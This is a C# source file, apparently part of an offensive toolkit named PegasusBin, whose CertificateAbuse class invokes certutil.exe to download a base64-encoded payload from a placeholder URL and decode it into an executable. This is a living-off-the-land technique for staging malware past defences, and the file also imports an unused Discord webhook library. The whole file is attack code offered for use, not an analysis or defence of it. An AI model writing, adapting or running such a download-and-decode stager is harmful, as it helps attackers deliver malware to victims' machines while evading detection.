using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using Discord;
using Discord.Webhook;

namespace PegasusBin.Bins
{
    class CertificateAbuse
    {
        public static void CertMain()
        {
            string b64Url = "http://example.com/payload.b64"; // url hosting base64-encoded payload
            string b64File = "*.txt"; // change name
            string decodedFile = "*.exe"; // change name

            CertAbuse("certutil.exe", $"-urlcache -split -f {b64Url} {b64File}");

            // decode the base64 payload
            CertAbuse("certutil.exe", $"-decode {b64File} {decodedFile}");
        }

        private static void CertAbuse(string fileName, string arguments)
        {
            Console.WriteLine($"[>] Running: {fileName} {arguments}");
            var psi = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (var process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrWhiteSpace(error))
                    Console.WriteLine("[-] Error:\n" + error);
            }
        }
    }
}
